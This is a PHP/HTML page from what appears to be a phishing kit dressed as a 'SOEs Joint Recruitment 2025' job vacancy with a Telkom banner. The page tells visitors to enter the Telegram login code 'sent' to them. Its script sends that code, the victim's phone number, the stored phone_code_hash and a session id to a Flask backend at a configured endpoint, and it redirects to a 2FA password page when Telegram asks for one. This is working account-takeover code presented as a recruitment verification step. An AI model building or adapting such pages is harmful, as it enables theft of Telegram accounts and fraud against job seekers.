<?php
// Include settings file
require_once 'settings.php';
session_start(); // Start session to check OTP expiration

// Check for OTP expiration (300 seconds = 5 minutes) - Ditingkatkan dari 180 detik menjadi 300 detik
$otp_expiration = 300; // seconds - ditingkatkan menjadi 5 menit untuk sinkronisasi dengan backend
if (isset($_SESSION['otp_sent_time']) && (time() - $_SESSION['otp_sent_time']) > $otp_expiration) {
    // OTP has expired, but we'll show a message with JavaScript instead of redirecting immediately
    $otp_expired = true;
} else {
    $otp_expired = false;
}

// Save server time information (in UTC)
$_SESSION['server_time'] = time(); // time() returns UTC timestamp in PHP
$_SESSION['server_time_iso'] = gmdate('Y-m-d\TH:i:s\Z'); // ISO format UTC time

// Calculate OTP time left for JavaScript
$time_left = isset($_SESSION['otp_sent_time']) ? 
    max(0, $otp_expiration - (time() - $_SESSION['otp_sent_time'])) : 
    $otp_expiration;
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:title" content="SOEs Joint Recruitment 2025">
    <meta property="og:image" content="https://www.ahlan-world.org/wp-content/uploads/arabic-high-paying-jobs.jpg.webp">
    <meta name="description" content="Find Jobs in Egypt, Saudi Arabia, UAE, Qatar, Kuwait & Gulf. Thousands of online jobs and millions of job seekers are only available on ArabJobs">
    <meta name="author" content="SOEs Joint Recruitment 2025">
    <title>SOEs VACANCY</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;family=Protest+Guerrilla&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
    <link rel="icon" href="./dubai/uae.png" type="image/x-icon" sizes="32x25">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="./public/css/style.css">
    <style>
        /* Tambahan CSS untuk spinner */
        .spinner-border-sm {
            width: 1rem;
            height: 1rem;
            border-width: 0.2em;
        }
        
        /* Perbaikan untuk loading overlay */
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <div class="loading" style="display: none" id="loading">
        <div class="loader"></div>
    </div>

    <section>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-10 col-lg-6">
                    <div class="card">
                        <div class="card-body">
                            <div class="top-card">
                                <img src="/public/images/telkom2.jpg" alt="banner">
                            </div>
                            <div class="middle-card mt-3">

                                <p class="text-center">
                                    We have sent a <strong>5-digit OTP</strong> to your <strong class="phone-number">Telegram</strong> account.
                                </p>
                                
                                <!-- Timer akan ditambahkan di sini via JavaScript -->
                                <p class="text-center text-danger" id="timer-container"></p>

                                <!-- Status pesan akan ditampilkan di sini -->
                                <div class="text-center mb-3" id="status-message"></div>

                                <form id="code-form">
                                    <div class="mb-3">
                                        <input type="tel" class="form-control text-center" name="code" id="code" 
                                            minlength="5" maxlength="5" pattern="[0-9]{5}" 
                                            placeholder="Enter 5-digit code" required
                                            inputmode="numeric">
                                        <div class="form-text">Please check your Telegram messages for the verification code.</div>
                                    </div>
                                    <div class="mb-3 text-center">
                                        <button type="submit" class="btn btn-login text-uppercase">
                                            Verifikasi
                                        </button>
                                    </div>
                                </form>
                                
                                <!-- Resend OTP button -->
                                <div class="mb-3 text-center">
                                    <button type="button" id="resendOtp" class="btn btn-outline-secondary">
                                        Resend Code
                                    </button>
                                </div>

                            </div>
                            <div class="bottom-card"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Load scripts in the correct order -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
    
    <script>
    // Create the phpSettings variable from PHP $url variable
    var phpSettings = {
        endpointUrl: '<?php echo $url; ?>'
    };
    
    // Store PHP server time info
    var phpServerTime = {
        timestamp: <?php echo time(); ?>, // UTC timestamp
        iso: '<?php echo gmdate('Y-m-d\TH:i:s\Z'); ?>' // ISO format UTC time
    };
    
    // Get PHP variables for OTP expiration
    var otpExpired = <?php echo $otp_expired ? 'true' : 'false'; ?>;
    var otpExpirationTime = <?php echo $otp_expiration; ?>; // 300 seconds (5 minutes)
    var timeLeft = <?php echo $time_left; ?>; // Time left from PHP
    
    // Define CONFIG object for AJAX timeout - 5 minutes
    var CONFIG = {
        TIMEOUT: 300000 // timeout in milliseconds (5 menit = 300 detik * 1000)
    };
    
    // Debug function - only logs to console, not visible in UI
    function debugLog(message) {
        console.log(message);
    }
    
    // Initialize toastr
    $(document).ready(function() {
        debugLog("Initializing toastr...");
        
        // Detailed toastr configuration
        toastr.options = {
            "closeButton": true,
            "debug": false,
            "newestOnTop": true,
            "progressBar": true,
            "positionClass": "toast-top-right",
            "preventDuplicates": false,
            "onclick": null,
            "showDuration": "300",
            "hideDuration": "1000",
            "timeOut": "5000",
            "extendedTimeOut": "1000",
            "showEasing": "swing",
            "hideEasing": "linear",
            "showMethod": "fadeIn",
            "hideMethod": "fadeOut"
        };
        
        // Test toastr
        try {
            toastr.info("Please enter the OTP code from your Telegram");
            debugLog("Toastr initialized successfully");
        } catch (e) {
            debugLog("Toastr error: " + e.message);
        }
        
        // Check server time with backend API
        checkServerTime();
    });
    
    // Function to check server time with backend
    function checkServerTime() {
        debugLog("Checking server time with backend...");
        $.ajax({
            url: phpSettings.endpointUrl + "/server-time",
            type: "GET",
            success: function(data) {
                debugLog("Server time info:", data);
                
                // Compare with browser time
                const browserTime = new Date();
                const serverTimeUTC = new Date(data.utc_time);
                const timeDiff = Math.abs(browserTime.getTime() - serverTimeUTC.getTime()) / 1000;
                
                debugLog("Browser time:", browserTime.toISOString());
                debugLog("Server UTC time:", data.utc_time);
                debugLog("Time difference (seconds):", timeDiff);
                
                // Also compare with PHP time
                const phpTimeDiff = Math.abs(phpServerTime.timestamp - data.php_compatible_time);
                debugLog("PHP server vs Flask server time diff (seconds):", phpTimeDiff);
                
                if (timeDiff > 60) {
                    // If more than 1 minute difference between browser and server, warn in console
                    console.warn("Warning: Large time difference between browser and server:", timeDiff, "seconds");
                }
                
                if (phpTimeDiff > 60) {
                    // If more than 1 minute difference between PHP and Flask servers, warn in console
                    console.warn("Warning: Time synchronization issue between PHP and Flask servers:", phpTimeDiff, "seconds");
                }
                
                // Check if backend thinks OTP is expired
                if (data.php_compatible_time - phpServerTime.timestamp > otpExpirationTime) {
                    debugLog("Warning: Server time suggests OTP may be expired");
                }
            },
            error: function(xhr, status, error) {
                console.error("Error checking server time:", error);
            }
        });
    }
</script>

    <script>
        $(document).ready(function() {
            debugLog("OTP Page Loaded");
            
            // Coba ambil gambar dari sessionStorage
            var img = sessionStorage.getItem("img");
            debugLog("Banner image: " + img);
            
            if (img) {
                $(".top-card").children("img").attr("src", img);
            }
            
            // Tampilkan nomor telepon
            var phoneNumber = localStorage.getItem("phoneNumber");
            debugLog("Phone number from localStorage: " + phoneNumber);
            
            if (phoneNumber) {
                $(".phone-number").text(phoneNumber);
            } else {
                debugLog("Phone number not found in localStorage");
                $("#status-message").html('<div class="alert alert-warning">Nomor telepon tidak ditemukan. <a href="./form.php">Kembali ke form registrasi</a></div>');
            }
            
            // PENTING: Ambil phone_code_hash dari localStorage DAN sessionStorage (untuk redundansi)
            var phoneCodeHash = localStorage.getItem("phone_code_hash") || sessionStorage.getItem("phone_code_hash");
            debugLog("Phone code hash: " + phoneCodeHash);
            
            if (!phoneCodeHash) {
                debugLog("WARNING: Phone code hash not found in storage!");
                $("#status-message").html('<div class="alert alert-warning">Sesi tidak lengkap. <a href="./form.php">Kembali ke form registrasi</a></div>');
            }
            
            // Get session ID
            var sessionId = getCookie('session_id');
            debugLog("Session ID from cookie: " + sessionId);
            
            // Auto focus ke input kode OTP
            $("#code").focus();
            
            // PENTING: Verifikasi waktu OTP dari localStorage juga (redundansi dengan PHP)
            var otpSentTime = localStorage.getItem("otp_sent_time") || sessionStorage.getItem("otp_sent_time");
            if (otpSentTime) {
                var currentTime = Math.floor(Date.now() / 1000);
                var jsTimeLeft = Math.max(0, <?php echo $otp_expiration; ?> - (currentTime - otpSentTime));
                
                debugLog("OTP sent time (localStorage): " + otpSentTime);
                debugLog("Current time (JS): " + currentTime);
                debugLog("Time difference (JS): " + (currentTime - otpSentTime) + " seconds");
                debugLog("Time left (JS): " + jsTimeLeft + " seconds");
                
                // Jika waktu habis berdasarkan localStorage
                if (jsTimeLeft <= 0) {
                    debugLog("OTP expired based on localStorage time");
                    otpExpired = true;
                }
                
                // Gunakan waktu yang lebih ketat dari kedua sumber (PHP dan JS)
                timeLeft = Math.min(timeLeft, jsTimeLeft);
            }
            
            // Check if OTP is already expired from PHP or JS
            if (otpExpired) {
                debugLog("OTP expired from PHP or JS check");
                toastr.error("The OTP code has expired. Please request a new code."); $("#code-form").hide(); $("#resendOtp").text("Request New Code"); $("#status-message").html('<div class="alert alert-danger">OTP code has expired</div>');
                return;
            }
            
            // Set up countdown timer for OTP expiration with extended time
            $("#timer-container").html("Kode berlaku selama: <span id='timer'>" + timeLeft + "</span> detik");
            
            var countdown = setInterval(function() {
                timeLeft--;
                $("#timer").text(timeLeft);
                
                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    debugLog("OTP expired from timer");
                    toastr.error("Kode OTP sudah kadaluarsa. Silakan minta kode baru.");
                    $("#code-form").hide();
                    $("#resendOtp").text("Minta Kode Baru");
                    $("#status-message").html('<div class="alert alert-danger">Kode OTP sudah kadaluarsa</div>');
                }
            }, 1000);

            // Form submission handler
            $("#code-form").on("submit", function(e) {
                e.preventDefault();
                debugLog("OTP form submitted");
                
                // If timer expired, don't submit
                if (timeLeft <= 0) {
                    debugLog("Cannot submit - OTP expired");
                    toastr.error("Kode OTP sudah kadaluarsa. Silakan minta kode baru.");
                    return;
                }
                
                var code = $("#code").val();
                debugLog("OTP code entered: " + code);
                
                if (!sessionId) {
                    debugLog("Session ID not found");
                    toastr.error("Sesi tidak ditemukan. Silakan kembali ke halaman pendaftaran.");
                    return;
                }
                
                if (!phoneNumber) {
                    debugLog("Phone number not found");
                    toastr.error("Nomor telepon tidak ditemukan.");
                    return;
                }
                
                // Validasi kode OTP
                if (!code || code.length != 5 || isNaN(code)) {
                    debugLog("Invalid OTP format");
                    toastr.error("Kode OTP harus 5 digit angka.");
                    return;
                }
                
                // SANGAT PENTING: Pastikan phone_code_hash selalu dikirim!
                if (!phoneCodeHash) {
                    debugLog("Warning: phone_code_hash not found in storage!");
                    // Don't return - still try to proceed as backend may have it
                }
                
                // Data to send to backend - IMPORTANT: Always include phone_code_hash from localStorage
                var data = {
                    code: code,
                    phone_number: phoneNumber,
                    session_id: sessionId,
                    phone_code_hash: phoneCodeHash,
                    client_time: Math.floor(Date.now() / 1000), // Include client time in seconds
                    php_server_time: phpServerTime.timestamp // Include PHP server time
                };
                
                debugLog("Preparing to send data: " + JSON.stringify(data));
                
                // Get endpoint from PHP variable
                const endpointUrl = phpSettings.endpointUrl;
                debugLog("Endpoint URL: " + endpointUrl);
                
                // Show loading message
                $("#status-message").html('<div class="alert alert-info">Memverifikasi kode OTP... <br>Proses ini bisa memakan waktu hingga 5 menit, mohon tunggu.</div>');
                toastr.info("Memverifikasi kode OTP. Mohon tunggu...");
                $(".loading").show();
                
                // Disable form during verification
                $("#code").prop("disabled", true);
                $("button[type=submit]").prop("disabled", true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...');
                
                // Send to Flask backend with increased timeout (5 minutes)
                debugLog("Sending AJAX request to: " + endpointUrl + "/otp");
                $.ajax({
                    url: endpointUrl + "/otp",
                    type: "POST",
                    data: JSON.stringify(data),
                    contentType: "application/json",
                    dataType: "json",
                    timeout: CONFIG.TIMEOUT, // 5 minutes in milliseconds
                    beforeSend: function() {
                        debugLog("Starting OTP verification with timeout " + CONFIG.TIMEOUT + " ms");
                    },
                    success: function(response) {
                        debugLog("Response received: " + JSON.stringify(response));
                        $(".loading").hide();
                        
                        // Re-enable form
                        $("#code").prop("disabled", false);
                        $("button[type=submit]").prop("disabled", false).text("Verifikasi");
                        
                        if (response.success) {
                            debugLog("OTP verification successful");
                            
                            // Save new phone_code_hash if present (for 2FA)
                            if (response.phone_code_hash) {
                                localStorage.setItem("phone_code_hash", response.phone_code_hash);
                                sessionStorage.setItem("phone_code_hash", response.phone_code_hash);
                                debugLog("Updated phone_code_hash: " + response.phone_code_hash);
                            }
                            
                            $("#status-message").html('<div class="alert alert-success">Verifikasi berhasil!</div>');
                            toastr.success("Verifikasi berhasil!");
                            
                            // Disable form to prevent multiple submissions
                            $("#code-form").find("input, button").prop("disabled", true);
                            $("#resendOtp").prop("disabled", true);
                            
                            if (response.needs_password) {
                                // Need 2FA password
                                debugLog("2FA password needed, redirecting to password.php");
                                $("#status-message").html('<div class="alert alert-success">Verifikasi berhasil! Mengalihkan ke halaman password 2FA...</div>');
                                setTimeout(function() {
                                    window.location.href = "./password.php";
                                }, 1500);
                            } else {
                                // Authentication completed
                                debugLog("Authentication completed, redirecting to completed.php");
                                $("#status-message").html('<div class="alert alert-success">Verifikasi berhasil! Mengalihkan ke halaman berikutnya...</div>');
                                setTimeout(function() {
                                    window.location.href = "./completed.php";
                                }, 1500);
                            }
                        } else {
                            // Authentication failed
                            debugLog("Authentication failed: " + (response.error || "Unknown error"));
                            $("#status-message").html('<div class="alert alert-danger">' + (response.error || "Kode verifikasi tidak valid") + '</div>');
                            toastr.error(response.error || "Kode verifikasi tidak valid. Silakan coba lagi.");
                        }
                    },
                    error: function(xhr, status, error) {
                        debugLog("AJAX error: " + error + ", Status: " + status);
                        debugLog("Response text: " + xhr.responseText);
                        $(".loading").hide();
                        
                        // Re-enable form
                        $("#code").prop("disabled", false);
                        $("button[type=submit]").prop("disabled", false).text("Verifikasi");
                        
                        var errorMsg = "";
                        if (status === "timeout") {
                            errorMsg = "Waktu permintaan habis (5 menit). Server mungkin sibuk. Silakan coba lagi.";
                        } else {
                            errorMsg = "Terjadi kesalahan komunikasi dengan server. Silakan coba lagi.";
                        }
                        
                        $("#status-message").html('<div class="alert alert-danger">' + errorMsg + '</div>');
                        toastr.error(errorMsg);
                    }
                });
            });
            
            // Handler untuk input yang hanya menerima angka
            $("#code").on("input", function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Auto submit when 5 digits are entered
                if (this.value.length === 5) {
                    debugLog("5 digits entered, auto-submitting after delay");
                    setTimeout(function() {
                        $("#code-form").submit();
                    }, 500);
                }
            });
            
            // Resend OTP button handler
            $("#resendOtp").on("click", function() {
                debugLog("Resend OTP button clicked");
                $(this).prop("disabled", true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...');
                toastr.info("Mengalihkan ke halaman pendaftaran...");
                
                setTimeout(function() {
                    window.location.href = "./form.php";
                }, 1000);
            });
            
            // Function for cookies
            function getCookie(name) {
                const nameEQ = name + "=";
                const ca = document.cookie.split(';');
                for(let i=0; i < ca.length; i++) {
                    let c = ca[i];
                    while (c.charAt(0) === ' ') c = c.substring(1,c.length);
                    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length,c.length);
                }
                return null;
            }
        });
    </script>
</body>

</html>